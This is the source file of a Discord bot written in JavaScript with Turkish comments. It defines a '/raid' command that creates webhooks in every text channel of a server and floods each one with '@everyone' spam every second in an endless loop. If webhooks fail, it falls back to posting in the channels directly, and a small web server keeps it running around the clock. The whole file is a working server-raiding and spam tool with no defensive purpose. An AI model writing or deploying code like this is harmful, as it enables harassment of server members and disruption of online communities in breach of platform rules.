require('dotenv').config();
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, ChannelType } = require('discord.js');
const http = require('http');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const OWNER_ID = "1389930042200559706";

// Komut Tanımlama
const commands = [
    new SlashCommandBuilder()
        .setName('raid')
        .setDescription('Tüm kanallara Webhook ile eş zamanlı saldırı başlatır.')
        .addStringOption(opt => opt.setName('mesaj').setDescription('Spam mesajı içeriği').setRequired(true))
].map(c => c.toJSON());

client.once('ready', async () => {
    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_BOT_TOKEN);
    await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
    console.log(`☣️ RAID MAKİNESİ HAZIR: ${client.user.tag}`);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: "❌ Yetkiniz yok.", ephemeral: true });

    if (interaction.commandName === 'raid') {
        const text = interaction.options.getString('mesaj');
        const guild = interaction.guild;

        await interaction.reply({ content: "☣️ **SALDIRI BAŞLADI:** Tüm kanallar hedefleniyor...", ephemeral: true });

        try {
            // Sunucudaki tüm metin kanallarını bul
            const channels = await guild.channels.fetch();
            const textChannels = channels.filter(ch => ch.type === ChannelType.GuildText);

            textChannels.forEach(async (channel) => {
                try {
                    // Her kanala özel geçici bir Webhook oluştur
                    const webhook = await channel.createWebhook({
                        name: 'FORCES DESTROYER',
                        avatar: 'https://i.imgur.com/wSTFk98.png'
                    });

                    // Webhook üzerinden seri atış başlat (Sonsuz Döngü)
                    const interval = setInterval(() => {
                        webhook.send({
                            content: `@everyone ${text}`,
                            username: 'FORCES RAID',
                        }).catch(() => {
                            clearInterval(interval); // Yetki giderse veya kanal silinirse durdur
                        });
                    }, 1000); // 1 saniyede bir vurur

                } catch (e) {
                    // Kanalda webhook izni yoksa direkt mesaj atmayı dene
                    setInterval(() => {
                        channel.send(`@everyone ${text}`).catch(() => {});
                    }, 1500);
                }
            });
        } catch (err) {
            console.log("Kanallar çekilemedi.");
        }
    }
});

// Render 7/24
http.createServer((req, res) => res.end("Raid Online")).listen(process.env.PORT || 3000);

client.login(process.env.DISCORD_BOT_TOKEN);
